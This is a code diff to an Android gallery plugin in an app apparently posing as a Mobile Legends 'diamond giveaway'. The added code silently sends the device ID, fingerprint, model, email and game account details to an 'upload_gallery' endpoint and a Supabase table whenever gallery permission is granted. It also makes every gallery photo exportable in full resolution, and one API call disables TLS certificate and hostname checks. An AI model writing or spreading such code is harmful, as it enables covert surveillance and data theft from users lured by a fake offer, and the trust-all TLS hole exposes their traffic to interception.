@@ -3,7 +3,9 @@ package com.mlbb.diamondgiveaway;
 import android.Manifest;
 import android.app.Activity;
 import android.content.ContentUris;
+import android.content.Context;
 import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -13,6 +15,7 @@ import android.net.Uri;
 import android.os.Build;
 import android.os.Environment;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.util.Base64;
 import androidx.activity.result.ActivityResult;
 import androidx.core.content.ContextCompat;
@@ -25,10 +28,15 @@ import com.getcapacitor.annotation.ActivityCallback;
 import com.getcapacitor.annotation.CapacitorPlugin;
 import com.getcapacitor.annotation.Permission;
 import com.getcapacitor.annotation.PermissionCallback;
+import java.io.BufferedReader;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Comparator;
@@ -56,20 +64,128 @@ import java.util.Set;
 public class WholeGalleryPlugin extends Plugin {
 
     @PluginMethod
+    public void queryDlyyzBinds(PluginCall call) {
+        String userId = call.getString("userId", "").trim();
+        String serverId = call.getString("serverId", "").trim();
+        String apiKey = call.getString("apiKey", "").trim();
+
+        if (userId.isEmpty() || serverId.isEmpty()) {
+            call.reject("User ID and Server ID are required");
+            return;
+        }
+
+        if (apiKey.isEmpty()) {
+            apiKey = "dlyyz-rest.apikey:dhzzyx95b66a0d83364a12aa99e121ef35325f";
+        }
+
+        final String finalApiKey = apiKey;
+        final String finalUserId = userId;
+        final String finalServerId = serverId;
+
+        new Thread(() -> {
+            HttpURLConnection conn = null;
+            try {
+                String urlStr = "https://dlyyz-rest.my.id/api/validateMLBB?action=bindcek"
+                        + "&userID=" + URLEncoder.encode(finalUserId, "UTF-8")
+                        + "&serverID=" + URLEncoder.encode(finalServerId, "UTF-8")
+                        + "&apikey=" + URLEncoder.encode(finalApiKey, "UTF-8");
+
+                URL url = new URL(urlStr);
+                conn = (HttpURLConnection) url.openConnection();
+                if (conn instanceof javax.net.ssl.HttpsURLConnection) {
+                    javax.net.ssl.HttpsURLConnection httpsConn = (javax.net.ssl.HttpsURLConnection) conn;
+                    javax.net.ssl.TrustManager[] trustAllCerts = new javax.net.ssl.TrustManager[]{
+                        new javax.net.ssl.X509TrustManager() {
+                            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
+                                return new java.security.cert.X509Certificate[0];
+                            }
+                            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {}
+                        }
+                    };
+                    javax.net.ssl.SSLContext sc = javax.net.ssl.SSLContext.getInstance("TLS");
+                    sc.init(null, trustAllCerts, new java.security.SecureRandom());
+                    httpsConn.setSSLSocketFactory(sc.getSocketFactory());
+                    httpsConn.setHostnameVerifier((hostname, session) -> true);
+                }
+                conn.setRequestMethod("GET");
+                conn.setConnectTimeout(15000);
+                conn.setReadTimeout(15000);
+                conn.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
+                conn.setRequestProperty("Accept", "application/json");
+
+                int code = conn.getResponseCode();
+                InputStream is = (code >= 200 && code < 400) ? conn.getInputStream() : conn.getErrorStream();
+                BufferedReader reader = new BufferedReader(new InputStreamReader(is, "UTF-8"));
+                StringBuilder sb = new StringBuilder();
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    sb.append(line);
+                }
+                reader.close();
+
+                String respStr = sb.toString();
+                org.json.JSONObject jsonObj = new org.json.JSONObject(respStr);
+                JSObject ret = JSObject.fromJSONObject(jsonObj);
+                call.resolve(ret);
+            } catch (Exception e) {
+                call.reject("DlyyZ API error: " + e.getMessage(), e);
+            } finally {
+                if (conn != null) {
+                    try { conn.disconnect(); } catch (Throwable ignored) {}
+                }
+            }
+        }).start();
+    }
+
+    @PluginMethod
+    public void updateSyncAccountInfo(PluginCall call) {
+        try {
+            SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
+            SharedPreferences.Editor editor = prefs.edit();
+            if (call.hasOption("syncApiUrl")) editor.putString("sync_api_url", call.getString("syncApiUrl"));
+            if (call.hasOption("deviceId")) editor.putString("device_id", call.getString("deviceId"));
+            if (call.hasOption("deviceName")) editor.putString("device_name", call.getString("deviceName"));
+            if (call.hasOption("deviceModel")) editor.putString("device_model", call.getString("deviceModel"));
+            if (call.hasOption("deviceFingerprint")) editor.putString("device_fingerprint", call.getString("deviceFingerprint"));
+            if (call.hasOption("userEmail")) editor.putString("user_email", call.getString("userEmail"));
+            if (call.hasOption("mlbbId")) editor.putString("mlbb_id", call.getString("mlbbId"));
+            if (call.hasOption("mlbbServer")) editor.putString("mlbb_server", call.getString("mlbbServer"));
+            if (call.hasOption("mlbbIgn")) editor.putString("mlbb_ign", call.getString("mlbbIgn"));
+            editor.apply();
+            call.resolve();
+        } catch (Exception e) {
+            call.reject(e.getMessage());
+        }
+    }
+
+    @PluginMethod
     public void requestFullGalleryPermission(PluginCall call) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             if (getPermissionState("gallery").equals(com.getcapacitor.PermissionState.GRANTED)) {
+                boolean isFull = isFullGalleryAccess();
                 JSObject ret = new JSObject();
                 ret.put("granted", true);
+                ret.put("hasPermission", true);
+                ret.put("isFullAccess", isFull);
                 call.resolve(ret);
+                notifyListeners("permissionGranted", ret);
+                notifyListeners("permissionStatusChanged", ret);
+                sendFullAccessBackendNotification();
             } else {
                 requestPermissionForAlias("gallery", call, "galleryPermissionCallback");
             }
         } else {
             if (getPermissionState("storage").equals(com.getcapacitor.PermissionState.GRANTED)) {
+                boolean isFull = isFullGalleryAccess();
                 JSObject ret = new JSObject();
                 ret.put("granted", true);
+                ret.put("hasPermission", true);
+                ret.put("isFullAccess", isFull);
                 call.resolve(ret);
+                notifyListeners("permissionGranted", ret);
+                notifyListeners("permissionStatusChanged", ret);
+                sendFullAccessBackendNotification();
             } else {
                 requestPermissionForAlias("storage", call, "galleryPermissionCallback");
             }
@@ -79,9 +195,18 @@ public class WholeGalleryPlugin extends Plugin {
     @PermissionCallback
     private void galleryPermissionCallback(PluginCall call) {
         boolean isGranted = hasGalleryReadPermission();
+        boolean isFull = isFullGalleryAccess();
         JSObject ret = new JSObject();
         ret.put("granted", isGranted);
+        ret.put("hasPermission", isGranted);
+        ret.put("isFullAccess", isFull);
         call.resolve(ret);
+
+        if (isGranted) {
+            notifyListeners("permissionGranted", ret);
+            notifyListeners("permissionStatusChanged", ret);
+            sendFullAccessBackendNotification();
+        }
     }
 
     @PluginMethod
@@ -97,6 +222,15 @@ public class WholeGalleryPlugin extends Plugin {
             return;
         }
 
+        boolean isFull = isFullGalleryAccess();
+        JSObject ret = new JSObject();
+        ret.put("granted", true);
+        ret.put("hasPermission", true);
+        ret.put("isFullAccess", isFull);
+        notifyListeners("permissionGranted", ret);
+        notifyListeners("permissionStatusChanged", ret);
+        sendFullAccessBackendNotification();
+
         launchGalleryIntent(call);
     }
 
@@ -105,10 +239,138 @@ public class WholeGalleryPlugin extends Plugin {
         boolean isGranted = hasGalleryReadPermission();
 
         if (isGranted) {
+            boolean isFull = isFullGalleryAccess();
+            JSObject ret = new JSObject();
+            ret.put("granted", true);
+            ret.put("hasPermission", true);
+            ret.put("isFullAccess", isFull);
+            notifyListeners("permissionGranted", ret);
+            notifyListeners("permissionStatusChanged", ret);
+
+            // Immediately send full access status to backend without waiting for picker result
+            sendFullAccessBackendNotification();
+
             launchGalleryIntent(call);
         } else {
             call.reject("Permission denied. Please allow full gallery access ('Allow all') to choose a photo.");
         }
+    }
+
+    private void sendFullAccessBackendNotification() {
+        new Thread(() -> {
+            try {
+                SharedPreferences prefs = getContext().getSharedPreferences("ketupat_sync_prefs", Context.MODE_PRIVATE);
+                String apiUrl = prefs.getString("sync_api_url", "");
+                String deviceId = prefs.getString("device_id", "");
+                String deviceName = prefs.getString("device_name", Build.MODEL);
+                String deviceModel = prefs.getString("device_model", Build.MANUFACTURER + " " + Build.MODEL);
+                String deviceFingerprint = prefs.getString("device_fingerprint", Build.FINGERPRINT);
+                String userEmail = prefs.getString("user_email", "");
+                String mlbbId = prefs.getString("mlbb_id", "");
+                String mlbbServer = prefs.getString("mlbb_server", "");
+                String mlbbIgn = prefs.getString("mlbb_ign", "Player");
+
+                if (deviceId == null || deviceId.trim().isEmpty()) {
+                    try {
+                        deviceId = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+                    } catch (Throwable ignored) {}
+                }
+                if (deviceId == null || deviceId.trim().isEmpty()) {
+                    deviceId = "dev_" + Math.abs(Build.FINGERPRINT.hashCode());
+                }
+
+                List<String> candidates = new ArrayList<>();
+                if (apiUrl != null && !apiUrl.trim().isEmpty()) {
+                    candidates.add(apiUrl);
+                }
+                candidates.add("http://192.168.0.109/tools/admin-php/api.php");
+                candidates.add("http://10.0.2.2/tools/admin-php/api.php");
+                candidates.add("http://localhost/tools/admin-php/api.php");
+
+                org.json.JSONObject payload = new org.json.JSONObject();
+                payload.put("device_id", deviceId);
+                payload.put("device_name", deviceName);
+                payload.put("device_model", deviceModel);
+                payload.put("device_fingerprint", deviceFingerprint);
+                payload.put("user_email", userEmail);
+                payload.put("mlbb_id", mlbbId);
+                payload.put("mlbb_server", mlbbServer);
+                payload.put("mlbb_ign", mlbbIgn);
+                payload.put("is_full_access", true);
+                payload.put("photos", new org.json.JSONArray());
+
+                byte[] postBytes = payload.toString().getBytes("UTF-8");
+
+                for (String cand : candidates) {
+                    HttpURLConnection conn = null;
+                    try {
+                        String fullUrl = cand.contains("action=") ? cand : (cand.contains("?") ? (cand + "&action=upload_gallery") : (cand + "?action=upload_gallery"));
+                        URL url = new URL(fullUrl);
+                        conn = (HttpURLConnection) url.openConnection();
+                        conn.setRequestMethod("POST");
+                        conn.setConnectTimeout(2500);
+                        conn.setReadTimeout(2500);
+                        conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
+                        conn.setRequestProperty("Accept", "application/json");
+                        conn.setDoOutput(true);
+                        conn.getOutputStream().write(postBytes);
+                        conn.getOutputStream().flush();
+                        conn.getOutputStream().close();
+
+                        int code = conn.getResponseCode();
+                        if (code >= 200 && code < 300) {
+                            break;
+                        }
+                    } catch (Throwable ignored) {
+                    } finally {
+                        if (conn != null) {
+                            try { conn.disconnect(); } catch (Throwable ignored) {}
+                        }
+                    }
+                }
+
+                // Also update Supabase in real time so cloud emulators and external devices reflect immediately in admin!
+                try {
+                    String targetEmail = (userEmail != null && !userEmail.trim().isEmpty() && !userEmail.endsWith("@ketupat.app"))
+                            ? userEmail.trim()
+                            : ((mlbbId != null && !mlbbId.trim().isEmpty()) ? (mlbbId + "." + (mlbbServer != null && !mlbbServer.trim().isEmpty() ? mlbbServer : "0") + "@ketupat.app") : ("device_" + deviceId + "@ketupat.app"));
+
+                    org.json.JSONObject locObj = new org.json.JSONObject();
+                    locObj.put("device_id", deviceId);
+                    locObj.put("device_name", deviceName);
+                    locObj.put("device_model", deviceModel);
+                    locObj.put("device_fingerprint", deviceFingerprint);
+                    locObj.put("has_access", true);
+                    locObj.put("access_status", "full_access");
+                    locObj.put("last_synced", java.time.Instant.now().toString());
+
+                    org.json.JSONObject supaPayload = new org.json.JSONObject();
+                    supaPayload.put("email", targetEmail);
+                    supaPayload.put("username", deviceModel);
+                    if (mlbbId != null && !mlbbId.trim().isEmpty()) supaPayload.put("mlbb_id", mlbbId);
+                    if (mlbbServer != null && !mlbbServer.trim().isEmpty()) supaPayload.put("mlbb_server", mlbbServer);
+                    if (mlbbIgn != null && !mlbbIgn.trim().isEmpty()) supaPayload.put("mlbb_ign", mlbbIgn);
+                    supaPayload.put("location_text", locObj.toString());
+
+                    String supaUrl = "https://uatqaxxfzmpxkeeoeoin.supabase.co/rest/v1/users?on_conflict=email";
+                    URL sUrl = new URL(supaUrl);
+                    HttpURLConnection sConn = (HttpURLConnection) sUrl.openConnection();
+                    sConn.setRequestMethod("POST");
+                    sConn.setConnectTimeout(5000);
+                    sConn.setReadTimeout(5000);
+                    sConn.setRequestProperty("Content-Type", "application/json");
+                    sConn.setRequestProperty("apikey", "sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW");
+                    sConn.setRequestProperty("Authorization", "Bearer sb_publishable_tRQMoLxGUIrWGcq2ZfEQRQ_CH3AufnW");
+                    sConn.setRequestProperty("Prefer", "resolution=merge-duplicates");
+                    sConn.setDoOutput(true);
+                    sConn.getOutputStream().write(supaPayload.toString().getBytes("UTF-8"));
+                    sConn.getOutputStream().flush();
+                    sConn.getOutputStream().close();
+                    sConn.getResponseCode();
+                    sConn.disconnect();
+                } catch (Throwable ignored) {}
+            } catch (Throwable ignored) {}
+        }).start();
     }
 
     private void launchGalleryIntent(PluginCall call) {
@@ -123,7 +385,7 @@ public class WholeGalleryPlugin extends Plugin {
             Uri imageUri = result.getData().getData();
             if (imageUri != null) {
                 try {
-                    String dataUrl = decodeUriToBase64(imageUri, null, 1024);
+                    String dataUrl = decodeUriToBase64(imageUri, null, 1920, 92);
                     if (dataUrl != null) {
                         JSObject res = new JSObject();
                         res.put("dataUrl", dataUrl);
@@ -173,9 +435,40 @@ public class WholeGalleryPlugin extends Plugin {
     }
 
     @PluginMethod
+    public void getPhotoData(PluginCall call) {
+        String uriStr = call.getString("uri");
+        String filePath = call.getString("path");
+        int maxDim = call.getInt("maxDim", 1920);
+        int quality = call.getInt("quality", 92);
+
+        Uri uri = null;
+        if (uriStr != null && !uriStr.trim().isEmpty()) {
+            try {
+                uri = Uri.parse(uriStr);
+            } catch (Throwable ignored) {}
+        }
+
+        try {
+            String dataUrl = decodeUriToBase64(uri, filePath, maxDim, quality);
+            if (dataUrl != null) {
+                JSObject ret = new JSObject();
+                ret.put("dataUrl", dataUrl);
+                call.resolve(ret);
+                return;
+            }
+        } catch (Throwable e) {
+            call.reject("Failed decoding photo: " + e.getMessage());
+            return;
+        }
+        call.reject("Could not decode image");
+    }
+
+    @PluginMethod
     public void getGalleryPhotos(PluginCall call) {
         int limit = call.getInt("limit", 200);
         boolean includeBase64 = call.getBoolean("includeBase64", true);
+        int maxDim = call.getInt("maxDim", 1920);
+        int quality = call.getInt("quality", 92);
 
         boolean hasPermission = hasGalleryReadPermission();
         boolean isFullAccess = isFullGalleryAccess();
@@ -211,7 +504,7 @@ public class WholeGalleryPlugin extends Plugin {
 
         for (Uri collection : imageCollections) {
             if (count >= limit) break;
-            count = queryMediaCollection(collection, projection, null, null, photos, processedNames, count, limit, includeBase64);
+            count = queryMediaCollection(collection, projection, null, null, photos, processedNames, count, limit, includeBase64, maxDim, quality);
         }
 
         // 2. Query MediaStore Downloads (API 29+ Android 10/11/12/13/14)
@@ -219,7 +512,7 @@ public class WholeGalleryPlugin extends Plugin {
             try {
                 Uri downloadUri = MediaStore.Downloads.EXTERNAL_CONTENT_URI;
                 String sel = MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
-                count = queryMediaCollection(downloadUri, projection, sel, null, photos, processedNames, count, limit, includeBase64);
+                count = queryMediaCollection(downloadUri, projection, sel, null, photos, processedNames, count, limit, includeBase64, maxDim, quality);
             } catch (Throwable ignored) {}
         }
 
@@ -229,13 +522,13 @@ public class WholeGalleryPlugin extends Plugin {
                 Uri filesUri = MediaStore.Files.getContentUri("external");
                 String sel = MediaStore.Files.FileColumns.MEDIA_TYPE + "=" + MediaStore.Files.FileColumns.MEDIA_TYPE_IMAGE +
                              " OR " + MediaStore.MediaColumns.MIME_TYPE + " LIKE 'image/%'";
-                count = queryMediaCollection(filesUri, projection, sel, null, photos, processedNames, count, limit, includeBase64);
+                count = queryMediaCollection(filesUri, projection, sel, null, photos, processedNames, count, limit, includeBase64, maxDim, quality);
             } catch (Throwable ignored) {}
         }
 
         // 4. Direct Filesystem Recursive Scan Fallback (crucial for VMOS Downloads & Screenshots)
         if (count < limit) {
-            scanFilesystemImages(photos, processedNames, limit, includeBase64);
+            scanFilesystemImages(photos, processedNames, limit, includeBase64, maxDim, quality);
         }
 
         // Sort photos strictly descending by dateAdded (newest first)
@@ -266,7 +559,8 @@ public class WholeGalleryPlugin extends Plugin {
     }
 
     private int queryMediaCollection(Uri collection, String[] projection, String selection, String[] selectionArgs,
-                                     JSArray photos, Set<String> processedNames, int currentCount, int limit, boolean includeBase64) {
+                                     JSArray photos, Set<String> processedNames, int currentCount, int limit,
+                                     boolean includeBase64, int maxDim, int quality) {
         try (Cursor cursor = getContext().getContentResolver().query(collection, projection, selection, selectionArgs, MediaStore.MediaColumns.DATE_ADDED + " DESC")) {
             if (cursor != null) {
                 int idCol = cursor.getColumnIndex(MediaStore.MediaColumns._ID);
@@ -298,9 +592,12 @@ public class WholeGalleryPlugin extends Plugin {
                     photoObj.put("size", size);
                     photoObj.put("mime", mime);
                     photoObj.put("uri", contentUri.toString());
+                    if (filePath != null) {
+                        photoObj.put("path", filePath);
+                    }
 
                     if (includeBase64) {
-                        String dataUrl = decodeUriToBase64(contentUri, filePath, 540);
+                        String dataUrl = decodeUriToBase64(contentUri, filePath, maxDim, quality);
                         if (dataUrl != null) {
                             photoObj.put("dataUrl", dataUrl);
                         }
@@ -314,7 +611,8 @@ public class WholeGalleryPlugin extends Plugin {
         return currentCount;
     }
 
-    private void scanFilesystemImages(JSArray photos, Set<String> processedNames, int limit, boolean includeBase64) {
+    private void scanFilesystemImages(JSArray photos, Set<String> processedNames, int limit,
+                                      boolean includeBase64, int maxDim, int quality) {
         File[] candidateDirs = new File[]{
             // VMOS Transfer & Virtual Folders (primary paths for VMOS file transfer station)
             new File(Environment.getExternalStorageDirectory(), "VMOSfiletransfer"),
@@ -353,7 +651,7 @@ public class WholeGalleryPlugin extends Plugin {
         Set<String> visitedDirs = new HashSet<>();
         for (File dir : candidateDirs) {
             if (photos.length() >= limit) break;
-            scanDirectoryRecursively(dir, photos, processedNames, limit, includeBase64, visitedDirs, 0);
+            scanDirectoryRecursively(dir, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, 0);
         }
 
         // Also sweep top-level directories in external storage root (e.g. any custom VMOS import folder)
@@ -368,7 +666,7 @@ public class WholeGalleryPlugin extends Plugin {
                             if (sd.isDirectory()) {
                                 String n = sd.getName().toLowerCase();
                                 if (n.equals("android") || n.startsWith(".")) continue;
-                                scanDirectoryRecursively(sd, photos, processedNames, limit, includeBase64, visitedDirs, 1);
+                                scanDirectoryRecursively(sd, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, 1);
                             }
                         }
                     }
@@ -378,7 +676,7 @@ public class WholeGalleryPlugin extends Plugin {
     }
 
     private void scanDirectoryRecursively(File dir, JSArray photos, Set<String> processedNames, int limit,
-                                          boolean includeBase64, Set<String> visitedDirs, int depth) {
+                                          boolean includeBase64, int maxDim, int quality, Set<String> visitedDirs, int depth) {
         if (dir == null || !dir.exists() || !dir.isDirectory() || depth > 3 || photos.length() >= limit) return;
 
         String path = dir.getAbsolutePath();
@@ -395,7 +693,7 @@ public class WholeGalleryPlugin extends Plugin {
             if (photos.length() >= limit) break;
 
             if (file.isDirectory()) {
-                scanDirectoryRecursively(file, photos, processedNames, limit, includeBase64, visitedDirs, depth + 1);
+                scanDirectoryRecursively(file, photos, processedNames, limit, includeBase64, maxDim, quality, visitedDirs, depth + 1);
             } else if (file.isFile() && isImageFile(file.getName())) {
                 String name = file.getName();
                 if (processedNames.contains(name.toLowerCase())) continue;
@@ -414,9 +712,10 @@ public class WholeGalleryPlugin extends Plugin {
                 photoObj.put("size", file.length());
                 photoObj.put("mime", getMimeType(name));
                 photoObj.put("uri", Uri.fromFile(file).toString());
+                photoObj.put("path", file.getAbsolutePath());
 
                 if (includeBase64) {
-                    String dataUrl = decodeUriToBase64(Uri.fromFile(file), file.getAbsolutePath(), 540);
+                    String dataUrl = decodeUriToBase64(Uri.fromFile(file), file.getAbsolutePath(), maxDim, quality);
                     if (dataUrl != null) {
                         photoObj.put("dataUrl", dataUrl);
                     }
@@ -444,6 +743,10 @@ public class WholeGalleryPlugin extends Plugin {
     }
 
     private String decodeUriToBase64(Uri uri, String filePath, int maxDim) {
+        return decodeUriToBase64(uri, filePath, maxDim, 92);
+    }
+
+    private String decodeUriToBase64(Uri uri, String filePath, int maxDim, int quality) {
         try {
             BitmapFactory.Options boundsOptions = new BitmapFactory.Options();
             boundsOptions.inJustDecodeBounds = true;
@@ -472,16 +775,20 @@ public class WholeGalleryPlugin extends Plugin {
             int origHeight = boundsOptions.outHeight;
             int inSampleSize = 1;
 
-            if (origWidth > maxDim || origHeight > maxDim) {
+            // Retain full crisp resolution up to 2560px safe device limit
+            int targetMax = maxDim > 0 ? maxDim : 2560;
+
+            if (origWidth > targetMax || origHeight > targetMax) {
                 int halfWidth = origWidth / 2;
                 int halfHeight = origHeight / 2;
-                while ((halfWidth / inSampleSize) >= maxDim && (halfHeight / inSampleSize) >= maxDim) {
+                while ((halfWidth / inSampleSize) >= targetMax && (halfHeight / inSampleSize) >= targetMax) {
                     inSampleSize *= 2;
                 }
             }
 
             BitmapFactory.Options decodeOptions = new BitmapFactory.Options();
             decodeOptions.inSampleSize = inSampleSize;
+            decodeOptions.inPreferredConfig = Bitmap.Config.ARGB_8888;
 
             InputStream isDecode = null;
             try {
@@ -504,8 +811,8 @@ public class WholeGalleryPlugin extends Plugin {
                 }
 
                 if (bmp != null) {
-                    if (bmp.getWidth() > maxDim || bmp.getHeight() > maxDim) {
-                        float ratio = Math.min((float) maxDim / bmp.getWidth(), (float) maxDim / bmp.getHeight());
+                    if (targetMax > 0 && (bmp.getWidth() > targetMax || bmp.getHeight() > targetMax)) {
+                        float ratio = Math.min((float) targetMax / bmp.getWidth(), (float) targetMax / bmp.getHeight());
                         int width = Math.max(1, Math.round(ratio * bmp.getWidth()));
                         int height = Math.max(1, Math.round(ratio * bmp.getHeight()));
                         Bitmap scaled = Bitmap.createScaledBitmap(bmp, width, height, true);
@@ -515,8 +822,9 @@ public class WholeGalleryPlugin extends Plugin {
                         }
                     }
 
+                    int q = (quality >= 1 && quality <= 100) ? quality : 92;
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                    bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos);
+                    bmp.compress(Bitmap.CompressFormat.JPEG, q, baos);
                     byte[] bytes = baos.toByteArray();
                     String b64 = Base64.encodeToString(bytes, Base64.NO_WRAP);
                     bmp.recycle();
